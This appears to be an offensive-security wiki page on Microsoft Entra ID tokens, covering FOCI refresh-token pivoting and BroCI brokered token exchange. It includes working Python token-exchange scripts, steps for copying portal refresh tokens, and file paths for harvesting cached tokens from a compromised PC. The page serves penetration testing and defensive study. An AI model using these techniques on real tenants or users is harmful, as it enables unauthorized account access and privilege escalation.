@@ -1,0 +1,555 @@
+# Az - Tokens & Public Applications
+
+## Basic Information
+
+Entra ID is Microsoft's cloud-based identity and access management (IAM) platform, serving as the foundational authentication and authorization system for services like Microsoft 365 and Azure Resource Manager. Azure AD implements the OAuth 2.0 authorization framework and the OpenID Connect (OIDC) authentication protocol to manage access to resources.
+
+### OAuth
+
+**Key Participants in OAuth 2.0:**
+
+1. **Resource Server (RS):** Protects resources owned by the resource owner.
+2. **Resource Owner (RO):** Typically an end-user who owns the protected resources.
+3. **Client Application (CA):** An application seeking access to resources on behalf of the resource owner.
+4. **Authorization Server (AS):** Issues access tokens to client applications after authenticating and authorizing them.
+
+**Scopes and Consent:**
+
+- **Scopes:** Granular permissions defined on the resource server that specify access levels.
+- **Consent:** The process by which a resource owner grants a client application permission to access resources with specific scopes.
+
+**Microsoft 365 Integration:**
+
+- Microsoft 365 utilizes Azure AD for IAM and is composed of multiple "first-party" OAuth applications.
+- These applications are deeply integrated and often have interdependent service relationships.
+- To simplify user experience and maintain functionality, Microsoft grants "implied consent" or "pre-consent" to these first-party applications.
+- **Implied Consent:** Certain applications are automatically **granted access to specific scopes without explicit user or administrator approva**l.
+- These pre-consented scopes are typically hidden from both users and administrators, making them less visible in standard management interfaces.
+
+**Client Application Types:**
+
+1. **Confidential Clients:**
+   - Possess their own credentials (e.g., passwords or certificates).
+   - Can **securely authenticate themselves** to the authorization server.
+2. **Public Clients:**
+   - Do not have unique credentials.
+   - Cannot securely authenticate to the authorization server.
+   - **Security Implication:** An attacker can impersonate a public client application when requesting tokens, as there is no mechanism for the authorization server to verify the legitimacy of the application.
+
+## Authentication Tokens
+
+There are **three types of tokens** used in OIDC:
+
+- [**Access Tokens**](https://learn.microsoft.com/en-us/azure/active-directory/develop/access-tokens)**:** The client presents this token to the resource server to **access resources**. It can be used only for a specific combination of user, client, and resource and **cannot be revoked** until expiry - that is 1 hour by default.
+- **ID Tokens**: The client receives this **token from the authorization server**. It contains basic information about the user. It is **bound to a specific combination of user and client**.
+- **Refresh Tokens**: Provided to the client with access token. Used to **get new access and ID tokens**. It is bound to a specific combination of user and client and can be revoked. Default expiry is **90 days** for inactive refresh tokens and **no expiry for active tokens** (be from a refresh token is possible to get new refresh tokens).
+  - A refresh token should be tied to an **`aud`** , to some **scopes**, and to a **tenant** and it should only be able to generate access tokens for that aud, scopes (and no more) and tenant. However, this is not the case with **FOCI applications tokens**.
+  - A refresh token is encrypted and only Microsoft can decrypt it.
+  - Getting a new refresh token doesn't revoke the previous refresh token.
+
+> [!WARNING]
+> Information for **conditional access** is **stored** inside the **JWT**. So, if you request the **token from an allowed IP address**, that **IP** will be **stored** in the token and then you can use that token from a **non-allowed IP to access the resources**.
+
+### Access Tokens "aud"
+
+The field indicated in the "aud" field is the **resource server** (the application) used to perform the login.
+
+The command `az account get-access-token --resource-type [...]` supports the following types and each of them will add a specific "aud" in the resulting access token:
+
+> [!CAUTION]
+> Note that the following are just the APIs supported by `az account get-access-token` but there are more.
+
+<details>
+
+<summary>aud examples</summary>
+
+- **aad-graph (Azure Active Directory Graph API)**: Used to access the legacy Azure AD Graph API (deprecated), which allows applications to read and write directory data in Azure Active Directory (Azure AD).
+  - `https://graph.windows.net/`
+
+* **arm (Azure Resource Manager)**: Used to manage Azure resources through the Azure Resource Manager API. This includes operations like creating, updating, and deleting resources such as virtual machines, storage accounts, and more.
+  - `https://management.core.windows.net/ or https://management.azure.com/`
+
+- **batch (Azure Batch Services)**: Used to access Azure Batch, a service that enables large-scale parallel and high-performance computing applications efficiently in the cloud.
+  - `https://batch.core.windows.net/`
+
+* **data-lake (Azure Data Lake Storage)**: Used to interact with Azure Data Lake Storage Gen1, which is a scalable data storage and analytics service.
+  - `https://datalake.azure.net/`
+
+- **media (Azure Media Services)**: Used to access Azure Media Services, which provide cloud-based media processing and delivery services for video and audio content.
+  - `https://rest.media.azure.net`
+
+* **ms-graph (Microsoft Graph API)**: Used to access the Microsoft Graph API, the unified endpoint for Microsoft 365 services data. It allows you to access data and insights from services like Azure AD, Office 365, Enterprise Mobility, and Security services.
+  - `https://graph.microsoft.com`
+
+- **oss-rdbms (Azure Open Source Relational Databases)**: Used to access Azure Database services for open-source relational database engines like MySQL, PostgreSQL, and MariaDB.
+  - `https://ossrdbms-aad.database.windows.net`
+
+</details>
+
+### Access Tokens Scopes "scp"
+
+The scope of an access token is stored inside the scp key inside the access token JWT. These scopes define what the access token has access to.
+
+If a JWT is allowed to contact an specific API but **doesn't have the scope** to perform the requested action, it **won't be able to perform the action** with that JWT.
+
+### Get refresh & access token example
+
+```python
+# Code example from https://github.com/secureworks/family-of-client-ids-research
+import msal
+import requests
+import jwt
+from pprint import pprint
+from typing import Any, Dict, List
+
+# LOGIN VIA CODE FLOW AUTHENTICATION
+azure_cli_client = msal.PublicClientApplication(
+    "00b41c95-dab0-4487-9791-b9d2c32c80f2" # ID for Office 365 Management
+)
+device_flow = azure_cli_client.initiate_device_flow(
+    scopes=["https://graph.microsoft.com/.default"]
+)
+print(device_flow["message"])
+
+# Perform device code flow authentication
+
+azure_cli_bearer_tokens_for_graph_api = azure_cli_client.acquire_token_by_device_flow(
+    device_flow
+)
+pprint(azure_cli_bearer_tokens_for_graph_api)
+
+# DECODE JWT
+def decode_jwt(base64_blob: str) -> Dict[str, Any]:
+    """Decodes base64 encoded JWT blob"""
+    return jwt.decode(
+        base64_blob, options={"verify_signature": False, "verify_aud": False}
+    )
+decoded_access_token = decode_jwt(
+    azure_cli_bearer_tokens_for_graph_api.get("access_token")
+)
+pprint(decoded_access_token)
+
+# GET NEW ACCESS TOKEN AND REFRESH TOKEN
+new_azure_cli_bearer_tokens_for_graph_api = (
+    # Same client as original authorization
+    azure_cli_client.acquire_token_by_refresh_token(
+        azure_cli_bearer_tokens_for_graph_api.get("refresh_token"),
+        # Same scopes as original authorization
+        scopes=["https://graph.microsoft.com/.default"],
+    )
+)
+pprint(new_azure_cli_bearer_tokens_for_graph_api)
+```
+
+### Other access token fields
+
+- **appid**: Application ID used to generate the token
+- **appidacr**: The Application Authentication Context Class Reference indicates how the client was authenticated, for a public client the value is 0, and if a client secret is used the value is 1
+- **acr**: The Authentication Context Class Reference claim is "0" when the end-user authentication did not meet the requirements of ISO/IEC 29115.
+- **amr**: The Authentication method indicates how the token was authenticated. A value of “pwd” indicates that a password was used.
+- **groups**: Indicates the groups where the principal is a member.
+- **iss**: The issues identifies the security token service (STS) that generated the token. e.g. https://sts.windows.net/fdd066e1-ee37-49bc-b08f-d0e152119b04/ (the uuid is the tenant ID)
+- **oid**: The object ID of the principal
+- **tid**: Tenant ID
+- **iat, nbf, exp**: Issued at (when it was issued), Not before (cannot be used before this time, usually same value as iat), Expiration time.
+
+## FOCI Tokens Privilege Escalation
+
+Previously it was mentioned that refresh tokens should be tied to the **scopes** it was generated with, to the **application** and **tenant** it was generated to. If any of these boundaries is broken, it's possible to escalate privileges as it will be possible to generate access tokens to other resources and tenants the user has access to and with more scopes than it was originally intended.
+
+Moreover, **this is possible with all refresh tokens** in the [Microsoft identity platform](https://learn.microsoft.com/en-us/entra/identity-platform/) (Microsoft Entra accounts, Microsoft personal accounts, and social accounts like Facebook and Google) because as the [**docs**](https://learn.microsoft.com/en-us/entra/identity-platform/refresh-tokens) mention: "Refresh tokens are bound to a combination of user and client, but **aren't tied to a resource or tenant**. A client can use a refresh token to acquire access tokens **across any combination of resource and tenant** where it has permission to do so. Refresh tokens are encrypted and only the Microsoft identity platform can read them."
+
+Moreover, note that the FOCI applications are public applications, so **no secret is needed** to authenticate to the server.
+
+Then known FOCI clients reported in the [**original research**](https://github.com/secureworks/family-of-client-ids-research/tree/main) can be [**found here**](https://github.com/secureworks/family-of-client-ids-research/blob/main/known-foci-clients.csv).
+
+### Get different scope
+
+Following with the previous example code, in this code it's requested a new token for a different scope:
+
+```python
+# Code from https://github.com/secureworks/family-of-client-ids-research
+azure_cli_bearer_tokens_for_outlook_api = (
+    # Same client as original authorization
+    azure_cli_client.acquire_token_by_refresh_token(
+        new_azure_cli_bearer_tokens_for_graph_api.get(
+            "refresh_token"
+        ),
+        # But different scopes than original authorization
+        scopes=[
+            "https://outlook.office.com/.default"
+        ],
+    )
+)
+pprint(azure_cli_bearer_tokens_for_outlook_api)
+```
+
+### Get different client and scopes
+
+```python
+# Code from https://github.com/secureworks/family-of-client-ids-research
+microsoft_office_client = msal.PublicClientApplication("d3590ed6-52b3-4102-aeff-aad2292ab01c")
+microsoft_office_bearer_tokens_for_graph_api = (
+    # This is a different client application than we used in the previous examples
+    microsoft_office_client.acquire_token_by_refresh_token(
+        # But we can use the refresh token issued to our original client application
+        azure_cli_bearer_tokens_for_outlook_api.get("refresh_token"),
+        # And request different scopes too
+        scopes=["https://graph.microsoft.com/.default"],
+    )
+)
+# How is this possible?
+pprint(microsoft_office_bearer_tokens_for_graph_api)
+```
+
+## NAA / BroCI (Nested App Authentication / Broker Client Injection)
+
+A BroCI refresh tokens is a brokered token exchange pattern where an existing refresh token is used with extra broker parameters to request tokens as another trusted first-party app.
+
+These refresh tokens must be minted in that broker context (a regular refresh token usually cannot be used as a BroCI refresh token).
+
+### Goal and purpose
+
+The goal of BroCI is to reuse a valid user session from a broker-capable app chain and request tokens for another trusted app/resource pair. Therefore, allowing to "escalate privileges" from the original token.
+
+From an offensive perspective, this matters because:
+
+- It can unlock pre-consented first-party app paths that are not accessible with standard refresh exchanges.
+- It can return access tokens for high-value APIs (for example, Microsoft Graph) under app identities with broad delegated permissions.
+- It expands post-authentication token pivoting opportunities beyond classic FOCI client switching.
+
+What changes in a NAA/BroCI refresh token is not the visible token format, but the **issuance context** and broker-related metadata that Microsoft validates during brokered refresh operations.
+
+NAA/BroCI token exchanges are **not** the same as a regular OAuth refresh exchange.
+
+- A regular refresh token (for example obtained via device code flow) is usually valid for standard `grant_type=refresh_token` operations.
+- A BroCI request includes additional broker context (`brk_client_id`, broker `redirect_uri`, and `origin`).
+- Microsoft validates whether the presented refresh token was minted in a matching brokered context.
+- Therefore, many "normal" refresh tokens fail in BroCI requests with errors such as `AADSTS900054` ("Specified Broker Client ID does not match ID in provided grant").
+- You generally cannot "convert" a normal refresh token into a BroCI-valid one in code.
+- You need a refresh token already issued by a compatible brokered flow.
+
+Check the web **<https://entrascopes.com/>** to find BroCI configured apps an the trust relationships they have.
+
+### Mental model
+
+Think of BroCI as:
+
+`user session -> brokered refresh token issuance -> brokered refresh call (brk_client_id + redirect_uri + origin) -> access token for target trusted app/resource`
+
+If any part of that broker chain does not match, the exchange fails.
+
+### Where to find a BroCI-valid refresh token
+
+One practical way is browser portal traffic collection:
+
+1. Sign in to `https://entra.microsoft.com` (or Azure portal).
+2. Open DevTools -> Network.
+3. Filter for:
+   - `oauth2/v2.0/token`
+   - `management.core.windows.net`
+4. Identify the brokered token response and copy `refresh_token`.
+5. Use that refresh token with matching BroCI parameters (`brk_client_id`, `redirect_uri`, `origin`) when requesting tokens for target apps (for example ADIbizaUX / Microsoft_Azure_PIMCommon scenarios).
+
+### Common errors
+
+- `AADSTS900054`: The refresh token context does not match the supplied broker tuple (`brk_client_id` / `redirect_uri` / `origin`) or the token is not from a brokered portal flow.
+- `AADSTS7000218`: The selected client flow expects a confidential credential (`client_secret`/assertion), often seen when trying device code with a non-public client.
+
+<details>
+<summary>Python BroCI refresh helper (broci_auth.py)</summary>
+
+```python
+#!/usr/bin/env python3
+"""
+Python implementation of EntraTokenAid Broci refresh flow.
+
+Equivalent to Invoke-Refresh in EntraTokenAid.psm1 with support for:
+- brk_client_id
+- redirect_uri
+- Origin header
+
+Usage:
+  python3 broci_auth.py --refresh-token "<REFRESH_TOKEN>"
+
+How to obtain a Broci-valid refresh token (authorized testing only):
+  1) Open https://entra.microsoft.com and sign in.
+  2) Open browser DevTools -> Network.
+  3) Filter requests for:
+     - "oauth2/v2.0/token"
+     - "management.core.windows.net"
+  4) Locate the portal broker token response and copy the "refresh_token" value
+     (the flow should be tied to https://management.core.windows.net//).
+  5) Use that token with this script and Broci params:
+
+  python3 broci_auth.py \
+    --refresh-token "<PORTAL_BROKER_REFRESH_TOKEN>" \
+    --client-id "74658136-14ec-4630-ad9b-26e160ff0fc6" \
+    --tenant "organizations" \
+    --api "graph.microsoft.com" \
+    --scope ".default offline_access" \
+    --brk-client-id "c44b4083-3bb0-49c1-b47d-974e53cbdf3c" \
+    --redirect-uri "brk-c44b4083-3bb0-49c1-b47d-974e53cbdf3c://entra.microsoft.com" \
+    --origin "https://entra.microsoft.com" \
+    --token-out
+"""
+
+import argparse
+import base64
+import datetime as dt
+import json
+import re
+import sys
+import urllib.error
+import urllib.parse
+import urllib.request
+from typing import Any
+
+GUID_RE = re.compile(
+    r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$"
+)
+OIDC_SCOPES = {"offline_access", "openid", "profile", "email"}
+
+def resolve_api_scope_url(api: str, scope: str) -> str:
+    """
+    Match Resolve-ApiScopeUrl behavior from the PowerShell module.
+    """
+    if GUID_RE.match(api):
+        base_resource = api
+    elif api.lower().startswith("urn:") or "://" in api:
+        base_resource = api
+    else:
+        base_resource = f"https://{api}"
+
+    base_resource = base_resource.rstrip("/")
+
+    resolved: list[str] = []
+    for token in scope.split():
+        if not token.strip():
+            continue
+        if "://" in token:
+            resolved.append(token)
+        elif token.lower().startswith("urn:"):
+            resolved.append(token)
+        elif token in OIDC_SCOPES:
+            resolved.append(token)
+        elif GUID_RE.match(token):
+            resolved.append(f"{token}/.default")
+        else:
+            normalized = ".default" if token in {"default", ".default"} else token
+            resolved.append(f"{base_resource}/{normalized}")
+
+    return " ".join(resolved)
+
+def parse_jwt_payload(jwt_token: str) -> dict[str, Any]:
+    parts = jwt_token.split(".")
+    if len(parts) != 3:
+        raise ValueError("Invalid JWT format.")
+    payload = parts[1]
+    padding = "=" * ((4 - len(payload) % 4) % 4)
+    decoded = base64.urlsafe_b64decode((payload + padding).encode("ascii"))
+    return json.loads(decoded.decode("utf-8"))
+
+def refresh_broci_token(
+    refresh_token: str,
+    client_id: str,
+    scope: str,
+    api: str,
+    tenant: str,
+    user_agent: str,
+    origin: str | None,
+    brk_client_id: str | None,
+    redirect_uri: str | None,
+    disable_cae: bool,
+) -> dict[str, Any]:
+    api_scope_url = resolve_api_scope_url(api=api, scope=scope)
+
+    headers = {
+        "User-Agent": user_agent,
+        "X-Client-Sku": "MSAL.Python",
+        "X-Client-Ver": "1.31.0",
+        "X-Client-Os": "win32",
+        "Content-Type": "application/x-www-form-urlencoded",
+    }
+    if origin:
+        headers["Origin"] = origin
+
+    body: dict[str, str] = {
+        "grant_type": "refresh_token",
+        "client_id": client_id,
+        "scope": api_scope_url,
+        "refresh_token": refresh_token,
+    }
+    if not disable_cae:
+        body["claims"] = '{"access_token": {"xms_cc": {"values": ["CP1"]}}}'
+    if brk_client_id:
+        body["brk_client_id"] = brk_client_id
+    if redirect_uri:
+        body["redirect_uri"] = redirect_uri
+
+    data = urllib.parse.urlencode(body).encode("utf-8")
+    token_url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
+    req = urllib.request.Request(token_url, data=data, headers=headers, method="POST")
+
+    try:
+        with urllib.request.urlopen(req) as resp:
+            raw = resp.read().decode("utf-8")
+    except urllib.error.HTTPError as e:
+        err_raw = e.read().decode("utf-8", errors="replace")
+        try:
+            err_json = json.loads(err_raw)
+            short = err_json.get("error", "unknown_error")
+            desc = err_json.get("error_description", err_raw)
+            raise RuntimeError(f"{short}: {desc}") from None
+        except json.JSONDecodeError:
+            raise RuntimeError(f"HTTP {e.code}: {err_raw}") from None
+
+    tokens = json.loads(raw)
+    if "access_token" not in tokens:
+        raise RuntimeError("Token endpoint response did not include access_token.")
+    return tokens
+
+def main() -> int:
+    parser = argparse.ArgumentParser(
+        description="Broci refresh flow in Python (EntraTokenAid Invoke-Refresh equivalent)."
+    )
+    parser.add_argument("--refresh-token", required=True, help="Refresh token (required).")
+    parser.add_argument(
+        "--client-id",
+        default="04b07795-8ddb-461a-bbee-02f9e1bf7b46",
+        help="Client ID (default: Azure CLI).",
+    )
+    parser.add_argument(
+        "--scope",
+        default=".default offline_access",
+        help="Scopes (default: '.default offline_access').",
+    )
+    parser.add_argument(
+        "--api", default="graph.microsoft.com", help="API resource (default: graph.microsoft.com)."
+    )
+    parser.add_argument("--tenant", default="common", help="Tenant (default: common).")
+    parser.add_argument(
+        "--user-agent",
+        default="python-requests/2.32.3",
+        help="User-Agent sent to token endpoint.",
+    )
+    parser.add_argument("--origin", default=None, help="Optional Origin header.")
+    parser.add_argument(
+        "--brk-client-id", default=None, help="Optional brk_client_id (Broci flow)."
+    )
+    parser.add_argument(
+        "--redirect-uri", default=None, help="Optional redirect_uri (Broci flow)."
+    )
+    parser.add_argument(
+        "--disable-cae",
+        action="store_true",
+        help="Disable CAE claims in token request.",
+    )
+    parser.add_argument(
+        "--token-out",
+        action="store_true",
+        help="Print access/refresh tokens in output.",
+    )
+    parser.add_argument(
+        "--disable-jwt-parsing",
+        action="store_true",
+        help="Do not parse JWT claims.",
+    )
+
+    args = parser.parse_args()
+
+    print("[*] Sending request to token endpoint")
+    try:
+        tokens = refresh_broci_token(
+            refresh_token=args.refresh_token,
+            client_id=args.client_id,
+            scope=args.scope,
+            api=args.api,
+            tenant=args.tenant,
+            user_agent=args.user_agent,
+            origin=args.origin,
+            brk_client_id=args.brk_client_id,
+            redirect_uri=args.redirect_uri,
+            disable_cae=args.disable_cae,
+        )
+    except Exception as e:
+        print(f"[!] Error: {e}", file=sys.stderr)
+        return 1
+
+    expires_in = int(tokens.get("expires_in", 0))
+    expiration_time = (dt.datetime.now() + dt.timedelta(seconds=expires_in)).isoformat(timespec="seconds")
+    tokens["expiration_time"] = expiration_time
+
+    print(
+        "[+] Got an access token and a refresh token"
+        if tokens.get("refresh_token")
+        else "[+] Got an access token (no refresh token requested)"
+    )
+
+    if not args.disable_jwt_parsing:
+        try:
+            jwt_payload = parse_jwt_payload(tokens["access_token"])
+            audience = jwt_payload.get("aud", "")
+            print(f"[i] Audience: {audience} / Expires at: {expiration_time}")
+            tokens["scp"] = jwt_payload.get("scp")
+            tokens["tenant"] = jwt_payload.get("tid")
+            tokens["user"] = jwt_payload.get("upn")
+            tokens["client_app"] = jwt_payload.get("app_displayname")
+            tokens["client_app_id"] = args.client_id
+            tokens["auth_methods"] = jwt_payload.get("amr")
+            tokens["ip"] = jwt_payload.get("ipaddr")
+            tokens["audience"] = audience
+            if isinstance(audience, str):
+                tokens["api"] = re.sub(r"/$", "", re.sub(r"^https?://", "", audience))
+            if "xms_cc" in jwt_payload:
+                tokens["xms_cc"] = jwt_payload.get("xms_cc")
+        except Exception as e:
+            print(f"[!] JWT parse error: {e}", file=sys.stderr)
+            return 1
+    else:
+        print(f"[i] Expires at: {expiration_time}")
+
+    if args.token_out:
+        print("\nAccess Token:")
+        print(tokens.get("access_token", ""))
+        if tokens.get("refresh_token"):
+            print("\nRefresh Token:")
+            print(tokens["refresh_token"])
+
+    print("\nToken object (JSON):")
+    print(json.dumps(tokens, indent=2))
+    return 0
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
+
+</details>
+
+## Where to find tokens
+
+From an attackers perspective it's very interesting to know where is it possible to find access and refresh tokens when for example the PC of a victim is compromised:
+
+- Inside **`<HOME>/.Azure`**
+  - **`azureProfile.json`** contains info about logged in users from the past
+  - **`clouds.config contains`** info about subscriptions
+  - **`service_principal_entries.json`** contains applications credentials (tenant id, clients and secret). Only in Linux & macOS
+  - **`msal_token_cache.json`** contains contains access tokens and refresh tokens. Only in Linux & macOS 
+  - **`service_principal_entries.bin`** and msal_token_cache.bin are used in Windows and are encrypted with DPAPI
+  - **`msal_http_cache.bin`** is a cache of HTTP request
+    - Load it: `with open("msal_http_cache.bin", 'rb') as f: pickle.load(f)`
+  - **`AzureRmContext.json`** contains information about previous logins using Az PowerShell (but no credentials)
+- Inside **`C:\Users\<username>\AppData\Local\Microsoft\IdentityCache\*`** are several `.bin` files with **access tokens**, ID tokens and account information encrypted with the users DPAPI.
+- It’s possible to find more **access tokens** in the `.tbres` files inside **`C:\Users\<username>\AppData\Local\Microsoft\TokenBroken\Cache\`** which contain a base64 encrypted with DPAPI with access tokens.
+- In Linux and macOS you can get **access tokens, refresh tokens and id tokens** from Az PowerShell (if used) running `pwsh -Command "Save-AzContext -Path /tmp/az-context.json"`
+  - In Windows this just generates id tokens.
+  - Possible to see if Az PowerShell was used in Linux and macSO checking is `$HOME/.local/share/.IdentityService/` exists (although the contained files are empty and useless)
+- If the user is **logged inside Azure with the browser**, according to this [**post**](https://www.infosecnoodle.com/p/obtaining-microsoft-entra-refresh?r=357m16&utm_campaign=post&utm_medium=web) it's possible to start the authentication flow with a **redirect to localhost**, make the browser automatically authorize the login, and receive the resh token. Note that there are only a few FOCI applications that allow redicet to localhost (like az cli or the powershell module), so these applications must be allowed.
+  - Another option explained in the blog is to use the tool [**BOF-entra-authcode-flow**](https://github.com/sudonoodle/BOF-entra-authcode-flow) which can use any application because it'll **get the OAuth code to then get a refresh token from the title of the final auth** page using the redirect URI `https://login.microsoftonline.com/common/oauth2/nativeclient`.
+
+## References
+
+- [https://github.com/secureworks/family-of-client-ids-research](https://github.com/secureworks/family-of-client-ids-research)
+- [https://github.com/Huachao/azure-content/blob/master/articles/active-directory/active-directory-token-and-claims.md](https://github.com/Huachao/azure-content/blob/master/articles/active-directory/active-directory-token-and-claims.md)
+- [https://specterops.io/blog/2025/10/15/naa-or-broci-let-me-explain/](https://specterops.io/blog/2025/10/15/naa-or-broci-let-me-explain/)
+- [https://specterops.io/blog/2025/08/13/going-for-brokering-offensive-walkthrough-for-nested-app-authentication/](https://specterops.io/blog/2025/08/13/going-for-brokering-offensive-walkthrough-for-nested-app-authentication/)
